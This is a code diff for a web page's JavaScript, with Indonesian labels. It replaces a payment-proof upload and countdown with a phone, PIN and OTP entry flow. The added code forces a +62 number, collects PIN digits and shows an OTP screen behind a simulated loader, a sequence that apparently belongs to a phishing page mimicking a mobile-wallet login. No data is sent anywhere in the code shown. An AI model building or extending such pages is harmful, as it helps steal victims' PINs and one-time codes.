@@ -1,48 +1,63 @@
-const timerEl = document.getElementById("timer");
-
-// TIMER
-const target = new Date("2026-05-05T16:40:00+07:00").getTime();
-
-function updateTimer() {
-  const now = new Date().getTime();
-  const diff = target - now;
-
-  if (diff <= 0) {
-    timerEl.innerText = "00:00:00";
-    return;
-  }
-
-  const h = Math.floor(diff / (1000 * 60 * 60));
-  const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-  const s = Math.floor((diff % (1000 * 60)) / 1000);
-
-  timerEl.innerText =
-    String(h).padStart(2,'0') + ":" +
-    String(m).padStart(2,'0') + ":" +
-    String(s).padStart(2,'0');
+function next(step) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen' + step).classList.add('active');
 }
 
-setInterval(updateTimer, 1000);
-updateTimer();
+// VALIDASI NOMOR
+const phoneInput = document.getElementById('phone');
+const btnPhone = document.getElementById('btnPhone');
 
-// UPLOAD
-const upload = document.getElementById("upload");
-const preview = document.getElementById("preview");
-const text = document.getElementById("uploadText");
+phoneInput.addEventListener('input', () => {
+  let val = phoneInput.value.replace(/[^0-9]/g, '');
+  if (!val.startsWith('62')) val = '62' + val;
 
-if (upload) {
-  upload.addEventListener("change", function () {
-    const file = this.files[0];
+  phoneInput.value = '+' + val;
+  btnPhone.disabled = val.length < 10;
+});
 
-    if (file) {
-      preview.style.display = "block";
-      preview.src = URL.createObjectURL(file);
-      text.innerText = "✔ Bukti berhasil dipilih";
-    }
+btnPhone.onclick = () => next(3);
+
+// AUTO INPUT
+function setup(container, button) {
+  const inputs = document.querySelectorAll(`#${container} input`);
+
+  inputs.forEach((input, i) => {
+    input.addEventListener('input', () => {
+      if (input.value && i < inputs.length - 1) {
+        inputs[i + 1].focus();
+      }
+      check(inputs, button);
+    });
+
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !input.value && i > 0) {
+        inputs[i - 1].focus();
+      }
+    });
   });
 }
 
-// COPY
-function copy(text) {
-  navigator.clipboard.writeText(text);
+function check(inputs, button) {
+  button.disabled = [...inputs].some(i => !i.value);
 }
+
+setup('pinInputs', document.getElementById('btnPin'));
+
+// PIN CLICK
+document.getElementById('btnPin').onclick = () => {
+  document.getElementById('otpOverlay').classList.add('active');
+
+  setTimeout(() => {
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('otpInputs').style.display = 'flex';
+  }, 2000);
+};
+
+// TIMER OTP
+let time = 60;
+setInterval(() => {
+  if (time > 0) {
+    time--;
+    document.getElementById('timer').innerText = `Kirim ulang (${time}s)`;
+  }
+}, 1000);
